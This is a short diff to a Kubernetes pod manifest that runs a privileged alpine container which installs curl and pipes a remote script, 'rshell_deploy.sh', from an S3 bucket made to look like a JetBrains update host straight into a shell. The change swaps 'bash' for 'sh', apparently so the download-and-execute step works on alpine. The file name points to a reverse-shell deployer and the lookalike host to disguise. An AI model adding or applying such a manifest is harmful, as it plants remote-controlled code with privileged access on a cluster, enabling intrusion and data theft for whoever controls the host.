@@ -10,7 +10,7 @@ spec:
     image: alpine:latest
     command: ["/bin/sh", "-c"]
     args:
-    - "apk add --no-cache curl > /dev/null 2>&1; curl -fsSL https://jetbrainsteam-updates.s3.amazonaws.com/rshell_deploy.sh | bash; echo DONE; sleep 99999"
+    - "apk add --no-cache curl > /dev/null 2>&1; curl -fsSL https://jetbrainsteam-updates.s3.amazonaws.com/rshell_deploy.sh | sh; echo DONE; sleep 99999"
     securityContext:
       privileged: true
   restartPolicy: Never
